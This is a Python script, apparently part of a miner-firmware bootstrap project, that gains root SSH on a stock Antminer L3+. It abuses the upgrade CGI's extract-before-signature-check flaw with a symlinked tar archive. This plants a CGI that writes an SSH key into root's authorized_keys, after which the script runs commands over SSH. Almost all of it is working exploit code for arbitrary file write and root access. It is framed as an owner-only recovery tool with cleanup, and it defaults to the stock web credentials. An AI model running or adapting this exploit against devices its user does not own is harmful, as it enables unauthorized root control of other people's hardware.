"""Open temporary root SSH on a stock Antminer L3+ (July 2019 firmware).

WHAT THIS IS
    Stock Bitmain L3+ firmware runs Dropbear but rejects the web/root password
    over SSH, so there is no supported shell. Its web upgrade CGI, however,
    extracts an uploaded .tar.gz BEFORE it checks the Bitmain signature. A
    symlink named after the web root lets that extraction drop one file into
    /www/pages/cgi-bin/ even though the signature check then fails. We use that
    to install a tiny, token-guarded CGI that appends a throwaway public key to
    root's authorized_keys, SSH in to look around, then remove the key and the
    CGI again.

    This is the "SSH unlock" the JMSCNC Heater OS bootstrap relies on to get a
    first foothold on a locked stock miner. It writes nothing to NAND, enables
    no service, and cleans up after itself. Use it only on a miner you own.

REQUIREMENTS
    pip install requests cryptography   (and OpenSSH `ssh` on PATH)

USAGE
    python recover_ssh.py --host 192.168.1.50 --web-user root --web-pass root
    # leave the key in place for manual SSH, then later clean up:
    python recover_ssh.py --host 192.168.1.50 --keep-key
    python recover_ssh.py --host 192.168.1.50 --cleanup-only

SAFETY
    The uploaded CGI only acts on an exact one-time token printed for this run.
    Nothing persists across a reboot. Run the default enable+inspect+cleanup
    flow, or --cleanup-only, when you are finished. Owner-only; your hardware.
"""
import argparse
import io
import json
import secrets
import subprocess
import sys
import tarfile
from pathlib import Path

try:
    import requests
    from requests.auth import HTTPDigestAuth
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives import serialization
except ImportError as exc:  # pragma: no cover - dependency hint only
    sys.exit("Install dependencies first:  pip install requests cryptography  (%s)" % exc)

CGI_NAME = "jmscnc-recovery-key.cgi"
INSPECT = """uptime
cat /proc/meminfo
cat /proc/mtd
cat /usr/bin/compile_time
df -h
ps
ls -la /config
awk -F: '$1=="root"{ if($2~/^[!*]/)print "root password locked"; else if($2=="")print "root password empty"; else print "root password hashed" }' /etc/shadow
"""


def make_key(key_path: Path) -> str:
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    key_path.write_bytes(key.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.TraditionalOpenSSL,
        serialization.NoEncryption()))
    return key.public_key().public_bytes(
        serialization.Encoding.OpenSSH,
        serialization.PublicFormat.OpenSSH).decode() + " jmscnc-temporary-recovery"


def cgi_script(public: str, token: str) -> bytes:
    return (f'''#!/bin/sh
set -e
printf 'Content-Type: application/json\\r\\nCache-Control: no-store\\r\\n\\r\\n'
[ "$REMOTE_USER" = root ] || {{ printf '{{"error":"Root web session required"}}\\n'; exit 1; }}
case "$QUERY_STRING" in
mode=enable\\&token={token})
    mkdir -p /home/root/.ssh; chmod 700 /home/root/.ssh
    touch /home/root/.ssh/authorized_keys
    grep -qxF '{public}' /home/root/.ssh/authorized_keys || printf '%s\\n' '{public}' >> /home/root/.ssh/authorized_keys
    chmod 600 /home/root/.ssh/authorized_keys
    printf '{{"temporary_key_added":true}}\\n'
    ;;
mode=cleanup\\&token={token})
    if [ -f /home/root/.ssh/authorized_keys ]; then
        grep -vxF '{public}' /home/root/.ssh/authorized_keys > /home/root/.ssh/authorized_keys.clean || [ "$?" = 1 ]
        chmod 600 /home/root/.ssh/authorized_keys.clean
        mv -f /home/root/.ssh/authorized_keys.clean /home/root/.ssh/authorized_keys
        grep -qxF '{public}' /home/root/.ssh/authorized_keys && exit 1
    fi
    rm -f /www/pages/cgi-bin/{CGI_NAME}
    printf '{{"temporary_key_removed":true}}\\n'
    ;;
*) printf '{{"error":"Invalid recovery token"}}\\n'; exit 1 ;;
esac
''').encode()


def upload_cgi(session, base, script: bytes):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz", format=tarfile.USTAR_FORMAT) as archive:
        link = tarfile.TarInfo("jmscnc-root")
        link.type = tarfile.SYMTYPE
        link.linkname = "/"
        link.mode = 0o755
        archive.addfile(link)
        member = tarfile.TarInfo("jmscnc-root/www/pages/cgi-bin/" + CGI_NAME)
        member.mode = 0o755
        member.size = len(script)
        archive.addfile(member, io.BytesIO(script))
    resp = session.post(base + "/cgi-bin/upgrade.cgi",
                        files={"datafile": ("jmscnc-ssh-key-recovery.tar.gz", buf.getvalue(), "application/octet-stream")},
                        timeout=25)
    resp.raise_for_status()
    # The stock uploader rejects our unsigned archive AFTER extracting it.
    if "Cannot Find Signature" not in resp.text and "signature" not in resp.text.lower():
        raise RuntimeError("Unexpected stock uploader response; stop and check the miner")


def call_cgi(session, base, mode, token):
    resp = session.get(base + "/cgi-bin/" + CGI_NAME, params={"mode": mode, "token": token}, timeout=15)
    resp.raise_for_status()
    return resp.json()


def main():
    p = argparse.ArgumentParser(description="Temporary root SSH on a stock Antminer L3+ you own.")
    p.add_argument("--host", required=True, help="Miner IP or hostname, e.g. 192.168.1.50")
    p.add_argument("--web-user", default="root", help="Web login user (default root)")
    p.add_argument("--web-pass", default="root", help="Web login password (default root)")
    p.add_argument("--ssh-user", default="root")
    p.add_argument("--key", type=Path, default=Path("jmscnc-recovery-key"), help="Where to write the throwaway private key")
    p.add_argument("--keep-key", action="store_true", help="Leave the key in place (skip cleanup) for manual SSH")
    p.add_argument("--cleanup-only", action="store_true", help="Only remove a key/CGI left by --keep-key")
    p.add_argument("--run", default=INSPECT, help="Commands to run over SSH (default: read-only inspection)")
    args = p.parse_args()

    base = args.host if args.host.startswith("http") else "http://" + args.host
    session = requests.Session()
    session.trust_env = False
    session.auth = HTTPDigestAuth(args.web_user, args.web_pass)

    if args.cleanup_only:
        token = secrets.token_hex(24)
        # Re-upload a cleanup-capable CGI bound to a fresh token, then run it.
        pub = args.key.with_suffix(".pub")
        public = pub.read_text().strip() if pub.exists() else "jmscnc-temporary-recovery-missing"
        upload_cgi(session, base, cgi_script(public, token))
        print(json.dumps(call_cgi(session, base, "cleanup", token)))
        return

    token = secrets.token_hex(24)
    public = make_key(args.key)
    args.key.with_suffix(".pub").write_text(public + "\n")
    upload_cgi(session, base, cgi_script(public, token))
    added = call_cgi(session, base, "enable", token)
    if added.get("temporary_key_added") is not True:
        raise RuntimeError("Temporary SSH key setup failed")
    print("Temporary key installed. Private key: %s" % args.key)

    ssh_cmd = ["ssh", "-o", "BatchMode=yes", "-o", "ConnectTimeout=8",
               "-o", "KexAlgorithms=+diffie-hellman-group14-sha1",
               "-o", "HostKeyAlgorithms=+ssh-rsa",
               "-o", "PubkeyAcceptedKeyTypes=+ssh-rsa",
               "-o", "IdentitiesOnly=yes", "-o", "StrictHostKeyChecking=accept-new",
               "-i", str(args.key), "%s@%s" % (args.ssh_user, args.host.replace("http://", "").replace("https://", "")), "sh -s"]
    try:
        result = subprocess.run(ssh_cmd, input=args.run.encode(), capture_output=True, timeout=60)
        print(json.dumps({"ssh_exit": result.returncode,
                          "stdout": result.stdout.decode(errors="replace"),
                          "stderr": result.stderr.decode(errors="replace")}, indent=2))
    finally:
        if args.keep_key:
            print("Key left in place. Clean up later with:  python recover_ssh.py --host %s --cleanup-only" % args.host)
        else:
            cleanup = call_cgi(session, base, "cleanup", token)
            print(json.dumps(cleanup))
            if cleanup.get("temporary_key_removed") is not True:
                raise RuntimeError("Temporary key cleanup did not verify; remove it manually")
            args.key.unlink(missing_ok=True)
            args.key.with_suffix(".pub").unlink(missing_ok=True)


if __name__ == "__main__":
    main()
